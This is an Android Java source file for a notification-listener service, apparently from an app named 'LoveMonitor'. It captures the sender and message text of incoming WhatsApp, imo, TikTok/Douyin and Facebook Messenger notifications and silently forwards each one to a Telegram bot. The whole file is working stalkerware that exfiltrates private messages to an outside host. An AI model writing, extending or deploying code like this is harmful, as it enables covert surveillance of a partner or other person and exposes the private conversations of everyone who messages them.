package com.love.myapp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NotificationService extends NotificationListenerService {

    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;

        if (extras != null) {
            Object titleObj = extras.get("android.title");
            Object textObj = extras.get("android.text");

            if (titleObj != null && textObj != null) {
                String title = titleObj.toString();
                String messageText = textObj.toString();

                if (packageName.contains("whatsapp") || 
                    packageName.contains("com.imo.android") || 
                    packageName.contains("ss.android.ugc.aweme") || 
                    packageName.contains("com.facebook.orca")) {

                    String report = "📌 *New Message Found*\n" +
                            "📱 App: " + packageName + "\n" +
                            "👤 From: " + title + "\n" +
                            "💬 Message: " + messageText;

                    sendToTelegram(report);
                }
            }
        }
    }

    private void sendToTelegram(final String message) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
                            "/sendMessage?chat_id=" + CHAT_ID + 
                            "&parse_mode=Markdown&text=" + URLEncoder.encode(message, "UTF-8");

                    URL url = new URL(urlString);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(10000); // 10 সেকেন্ড
                    conn.setReadTimeout(10000);
                    conn.setRequestMethod("GET");
                    
                    int responseCode = conn.getResponseCode();
                    Log.d("LoveMonitor", "Telegram Sent! Response: " + responseCode);
                } catch (Exception e) {
                    Log.e("LoveMonitor", "Telegram Error: " + e.getMessage());
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }
            }
        });
    }
}
